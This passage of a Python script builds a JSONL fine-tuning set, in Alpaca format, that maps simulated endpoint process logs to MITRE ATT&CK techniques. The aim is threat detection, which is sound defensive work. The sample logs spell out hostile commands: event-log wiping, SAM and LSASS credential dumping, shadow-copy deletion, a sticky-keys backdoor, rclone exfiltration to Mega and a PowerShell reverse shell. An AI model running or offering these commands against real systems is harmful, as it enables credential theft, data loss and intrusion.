        "explanation": "Impair Defenses. The adversary is using the Filter Manager Control program to unload the Windows Defender Minifilter driver, effectively blinding the antivirus."
    },
    {
        "log": '{"EventID": 1, "Image": "powershell.exe", "CommandLine": "Clear-EventLog -LogName Security, System, Application", "User": "admin"}',
        "ttp": "T1070.001",
        "explanation": "Indicator Removal on Host. A PowerShell cmdlet is being used to wipe the primary Windows Event Logs to destroy forensic traces."
    },
    {
        "log": '{"EventID": 1, "Image": "reg.exe", "CommandLine": "reg save HKLM\\\\SAM C:\\Temp\\sam.save /y", "User": "SYSTEM"}',
        "ttp": "T1003.002",
        "explanation": "OS Credential Dumping. The registry utility is abused to export a copy of the Security Account Manager (SAM) hive for offline password hash cracking."
    },
    {
        "log": '{"EventID": 1, "Image": "certutil.exe", "CommandLine": "certutil.exe -decode C:\\Temp\\encoded.txt C:\\Temp\\payload.exe"}',
        "ttp": "T1140",
        "explanation": "Deobfuscate/Decode Files or Information. Certutil is being abused to decode a base64-encoded payload that was previously transferred to the host."
    },
    {
        "log": '{"EventID": 1, "Image": "msbuild.exe", "CommandLine": "msbuild.exe C:\\Temp\\malicious_project.xml"}',
        "ttp": "T1127.001",
        "explanation": "Trusted Developer Utilities Proxy Execution. MSBuild is abused to execute inline C# code embedded within a malicious XML project file, evading defense mechanisms."
    },
    {
        "log": '{"EventID": 1, "Image": "rclone.exe", "CommandLine": "rclone copy C:\\Sensitive_Data mega:backup_folder -q", "User": "user01"}',
        "ttp": "T1567.002",
        "explanation": "Exfiltration to Cloud Storage. The attacker is using the rclone utility to exfiltrate sensitive data directly to a third-party cloud storage provider (Mega)."
    },
    {
        "log": '{"EventID": 1, "Image": "cmd.exe", "CommandLine": "copy C:\\Temp\\backdoor.exe \\"C:\\Users\\user01\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe\\""}',
        "ttp": "T1547.001",
        "explanation": "Registry Run Keys / Startup Folder. The adversary is copying a malicious executable to the user\'s Startup folder to establish persistence upon reboot."
    },
    {
        "log": '{"EventID": 1, "Image": "net.exe", "CommandLine": "net user /domain", "User": "guest"}',
        "ttp": "T1087.002",
        "explanation": "Account Discovery. An unprivileged user is attempting to enumerate all user accounts within the Active Directory domain."
    },
    {
        "log": '{"EventID": 1, "Image": "scrcons.exe", "CommandLine": "C:\\Windows\\System32\\wbem\\scrcons.exe -Embedding"}',
        "ttp": "T1047",
        "explanation": "Windows Management Instrumentation. The WMI Standard Event Consumer (scrcons.exe) is executing, strongly suggesting a malicious WMI Event Subscription payload has been triggered."
    },
    {
        "log": '{"EventID": 1, "Image": "powershell.exe", "CommandLine": "powershell.exe -ep bypass -c \\"Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}\\""}',
        "ttp": "T1490",
        "explanation": "Inhibit System Recovery. A WMI call via PowerShell is being used to systematically delete all volume shadow copies, preparing the host for a ransomware impact."
    },
    {
        "log": '{"EventID": 1, "Image": "rundll32.exe", "CommandLine": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 648 C:\\Temp\\lsass.dmp full", "User": "SYSTEM"}',
        "ttp": "T1003.001",
        "explanation": "OS Credential Dumping. The comsvcs.dll library is being abused via rundll32 to generate a memory dump of the LSASS process (PID 648) without requiring external tools."
    },
    {
        "log": '{"EventID": 1, "Image": "cmd.exe", "CommandLine": "cmd.exe /c ren C:\\Windows\\System32\\sethc.exe sethc.bak & copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe"}',
        "ttp": "T1546.008",
        "explanation": "Accessibility Features Abuse. The attacker is replacing the Sticky Keys binary (sethc.exe) with the command prompt (cmd.exe) to create a pre-authentication system-level backdoor."
    },
    {
        "log": '{"EventID": 1, "Image": "powershell.exe", "CommandLine": "$client = New-Object System.Net.Sockets.TCPClient(\'192.168.100.50\',4444);$stream = $client.GetStream();...", "User": "admin"}',
        "ttp": "T1059.001",
        "explanation": "Command and Scripting Interpreter. A raw PowerShell reverse shell script is being executed to establish an interactive command and control channel to the attacker\'s machine."
    },
    {
        "log": '{"EventID": 1, "Image": "wmic.exe", "CommandLine": "wmic /node:10.0.0.15 process call create \\"cmd.exe /c bcedit /set {default} recoveryenabled No & bcdedit /set {default} bootstatuspolicy ignoreallfailures\\""}',
        "ttp": "T1490",
        "explanation": "Inhibit System Recovery. Destructive commands are executed remotely via WMI to disable Windows recovery options, maximizing the impact of an imminent ransomware deployment."
    }
]

# ==========================================
# 2. 轉換為 Alpaca 訓練格式並寫入 JSONL
# ==========================================
output_file = "dataset_en.jsonl"

with open(output_file, "w", encoding="utf-8") as f:
    for sample in training_samples:
        
        # 為了確保模型學會輸出完美的 JSON，我們預先構造好解答的 JSON 字典
        response_dict = {
            "TTP_ID": sample["ttp"],
            "Explanation": sample["explanation"]
        }
        
        # 將字典轉為純文字 (確保 JSON 格式完美)
        response_json_str = json.dumps(response_dict, ensure_ascii=False)
        
        # 組裝成 Unsloth 需要的 Alpaca 格式
        alpaca_prompt = f"""Below is an instruction that describes a task, paired with an input that provides further context. Write a response that appropriately completes the request.
### Instruction:
Analyze the endpoint log, extract malicious features, and map to MITRE ATT&CK. You MUST output strictly in JSON containing 'TTP_ID' and 'Explanation'.
### Input:
{sample["log"]}
### Response:
{response_json_str}"""
        
        # 寫入單行 JSON (包含 text 鍵值)
        json_line = json.dumps({"text": alpaca_prompt}, ensure_ascii=False)
        f.write(json_line + "\n")

print(f"✅ 成功生成訓練資料集！檔案已儲存為：{output_file}")
print(f"📊 共計生成了 {len(training_samples)} 筆高質量英文訓練資料。")